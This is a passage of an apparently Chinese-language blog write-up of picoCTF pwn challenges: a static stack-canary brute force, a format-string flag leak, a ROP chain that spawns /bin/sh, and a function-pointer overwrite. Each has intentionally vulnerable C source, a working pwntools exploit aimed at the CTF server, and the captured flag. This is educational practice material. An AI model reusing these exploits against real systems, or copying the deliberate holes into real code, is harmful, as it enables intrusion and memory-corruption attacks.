class="line"></span><br><span class="line">  fgets(buf,FLAGSIZE,f); <span class="comment">// size bound read</span></span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_canary[CANARY_SIZE];</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_canary</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;canary.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;canary.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging canary.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fread(global_canary,<span class="keyword">sizeof</span>(<span class="type">char</span>),CANARY_SIZE,f);</span><br><span class="line">  fclose(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">char</span> canary[CANARY_SIZE];</span><br><span class="line">   <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">   <span class="type">char</span> length[BUFSIZE];</span><br><span class="line">   <span class="type">int</span> count;</span><br><span class="line">   <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">   <span class="built_in">memcpy</span>(canary,global_canary,CANARY_SIZE);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;How Many Bytes will You Write Into the Buffer?\n&gt; &quot;</span>);</span><br><span class="line">   <span class="keyword">while</span> (x&lt;BUFSIZE) &#123;</span><br><span class="line">      read(<span class="number">0</span>,length+x,<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (length[x]==<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">      x++;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">sscanf</span>(length,<span class="string">&quot;%d&quot;</span>,&amp;count);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input&gt; &quot;</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,count);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">memcmp</span>(canary,global_canary,CANARY_SIZE)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&quot;</span>); <span class="comment">// crash immediately</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Ok... Now Where&#x27;s the Flag?\n&quot;</span>);</span><br><span class="line">   fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  read_canary();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加了一个canary，每一次的canary都一样，有read函数可以精确控制写入字节数量，不会多写空字节，因此采用爆破的方式获取canary然后拿到flag。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">60065</span>)</span><br><span class="line"></span><br><span class="line">canary = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">i, j</span>):</span><br><span class="line">	ret = cyclic(<span class="number">64</span>)</span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(j):</span><br><span class="line">		ret += p8(canary[k])</span><br><span class="line">	<span class="keyword">return</span> ret + p8(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">65</span> + j).encode())</span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;Input&gt; &#x27;</span>, get_payload(i, j))</span><br><span class="line">		<span class="keyword">if</span> <span class="string">b&#x27;***** Stack Smashing Detected *****&#x27;</span> <span class="keyword">in</span> io.recv():</span><br><span class="line">			io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">60065</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			canary[j] = i</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">60065</span>)</span><br><span class="line"></span><br><span class="line">canary_value = canary[<span class="number">0</span>] + (canary[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + (canary[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (canary[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">64</span> + <span class="number">4</span> + <span class="number">16</span> + <span class="number">4</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input&gt; &#x27;</span>, cyclic(<span class="number">64</span>) + p32(canary_value) + cyclic(<span class="number">16</span>) + p32(<span class="number">0x8049336</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>canary的值为BiRd</p>
<p>picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}</p>
<h2 id="9-flag-leak"><a class="markdownIt-Anchor" href="#9-flag-leak"></a> 9. flag leak</h2>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readflag</span><span class="params">(<span class="type">char</span>* buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(buf,len,f); <span class="comment">// size bound read</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">char</span> flag[BUFSIZE];</span><br><span class="line">   <span class="type">char</span> story[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">   readflag(flag, FLAGSIZE);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Tell me a story and then I&#x27;ll tell you one &gt;&gt; &quot;</span>);</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%127s&quot;</span>, story);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a story - \n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(story);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个格式化字符串漏洞，通过gdb调试发现偏移为24的地方留有flag的地址+4。flag前面4个字符已知，因此直接打印这个地址对应的值即可。</p>
<p>picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}</p>
<h2 id="10-ropfu"><a class="markdownIt-Anchor" href="#10-ropfu"></a> 10. ropfu</h2>
<p>典型ROP攻击。</p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  vuln();</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>能够在程序中找到大量的rop材料，但还需要一个/bin/sh字符串。需要首先调用库函数将/bin/sh写入bss段，然后再系统调用execve来getshell。具体一些，execve的系统调用需要eax=0xB，ebx=read_addr，ecx=0，edx=0。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;saturn.picoctf.net&#x27;</span>, <span class="number">53996</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh\0&#x27;</span>))		<span class="comment"># &#x27;sh&#x27; addr, need to make ebx point to it</span></span><br><span class="line">sys_execve = <span class="number">0xb</span>						<span class="comment"># need to make eax be 0xb</span></span><br><span class="line"></span><br><span class="line">pop_eax_addr = <span class="number">0x80b074a</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x8049022</span></span><br><span class="line">pop_ecx_addr = <span class="number">0x8049e39</span></span><br><span class="line">pop_edx_ebx_addr = <span class="number">0x80583c9</span></span><br><span class="line">int_80_addr = <span class="number">0x804a3d2</span></span><br><span class="line">read_addr = <span class="number">0x806ecf0</span></span><br><span class="line">vuln_addr = <span class="number">0x8049d95</span></span><br><span class="line">bss_addr = <span class="number">0x80e62f0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: read &#x27;/bin/sh&#x27; into bss segment and return to vuln() function</span></span><br><span class="line">payload = cyclic(<span class="number">28</span>)</span><br><span class="line">payload += p32(read_addr) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;grasshopper!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: use &#x27;int 80&#x27; to call SYS_execve, set argument as:</span></span><br><span class="line"><span class="comment"># eax = 0xb</span></span><br><span class="line"><span class="comment"># ebx = &#x27;/bin/sh&#x27; address</span></span><br><span class="line"><span class="comment"># ecx = edx = 0</span></span><br><span class="line">payload = cyclic(<span class="number">28</span>)</span><br><span class="line">payload += p32(pop_eax_addr) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ebx_addr) + p32(<span class="number">0</span>) + p32(bss_addr)</span><br><span class="line">payload += p32(pop_ecx_addr) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_80_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;grasshopper!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>picoCTF{5n47ch_7h3_5h311_e81af635}</p>
<h1 id="12-function-overwrite"><a class="markdownIt-Anchor" href="#12-function-overwrite"></a> 12. function overwrite</h1>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">calculate_story_score</span><span class="params">(<span class="type">char</span> *story, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    score += story[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">easy_checker</span><span class="params">(<span class="type">char</span> *story, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (calculate_story_score(story, len) == <span class="number">1337</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> buf[FLAGSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(buf, FLAGSIZE, f); <span class="comment">// size bound read</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;re 1337. Here&#x27;s the flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve failed this class.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hard_checker</span><span class="params">(<span class="type">char</span> *story, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (calculate_story_score(story, len) == <span class="number">13371337</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> buf[FLAGSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(buf, FLAGSIZE, f); <span class="comment">// size bound read</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;re 13371337. Here&#x27;s the flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve failed this class.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> (*check)(<span class="type">char</span>*, <span class="type">size_t</span>) = hard_checker;</span><br><span class="line"><span class="type">int</span> fun[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> story[<span class="number">128</span>];</span><br><span class="line">  <span class="type">int</span> num1, num2;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me a story and then I&#x27;ll tell you if you&#x27;re a 1337 &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%127s&quot;</span>, story);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;num1, &amp;num2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (num1 &lt; <span class="number">10</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    fun[num1] += num2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check(story, <span class="built_in">strlen</span>(story));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要将函数指针check从hard_checker改为easy_checker。因为hard_checker会检查输入的story所有字节的ASCII码之和是否为13371337，由于输入长度有限，这显然不可能，而easy_checker则检查和是否为1337，可以实现。后面有一个在指定地址修改值的操作，使用负数绕过检查修改函数指针的值即可。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># io = process(&#x27;./vuln&#x27;)</span><br><span class="line">io = remote(&#x27;saturn.picoctf.net&#x27;, 54514)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;Tell me a story and then I\&#x27;ll tell you if you\&#x27;re a 1337 &gt;&gt; &#x27;, b&#x27;A&#x27; * 20 + b&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;On a totally unrelated note, give me two numbers. Keep the first one less than 10.&#x27;, b&#x27;-16 -314\n&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>picoCTF{0v3rwrit1ng_P01nt3rs_529bfb38}</p>
<h1 id="2-web-部分"><a class="markdownIt-Anchor" href="#2-web-部分"></a> 2. web 部分</h1>
<p>web没有系统学过，但是有的题过于简单，也能做。</p>
